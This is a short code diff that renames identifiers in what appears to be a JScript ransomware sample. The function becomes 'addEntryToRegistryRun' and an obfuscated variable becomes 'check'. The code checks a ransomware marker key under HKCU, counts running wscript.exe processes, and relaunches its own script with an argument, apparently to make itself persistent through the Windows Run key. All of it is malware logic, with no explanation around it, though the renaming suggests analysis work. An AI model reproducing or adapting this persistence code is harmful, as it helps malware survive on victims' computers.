@@ -1,10 +1,10 @@
-function createWindowsParts() {
-    var QCY;
+function addEntryToRegistryRun() {
+    var check;
     var runner = WScript.CreateObject("WScript.Shell");
     try {
         runner.RegRead("HKCU\\RAA\\Raa-fnl\\");
     } catch (e) {
-        QCY = 0;
+        check = 0;
     }
     var parts = [];
     var windowsScriptExec = "wscript.exe";
@@ -24,7 +24,7 @@ function createWindowsParts() {
             null
         }
     } while (iterator < parts.length);
-    if (counter < 2 && QCY == 0) {
+    if (counter < 2 && check == 0) {
         var scriptFullName = WScript.ScriptFullName;
         scriptFullName = scriptFullName + " argument";
         var runner2 = WScript.CreateObject("WScript.Shell");
@@ -35,4 +35,4 @@ function createWindowsParts() {
     }
     return 0;
 }
-createWindowsParts();
+addEntryToRegistryRun();
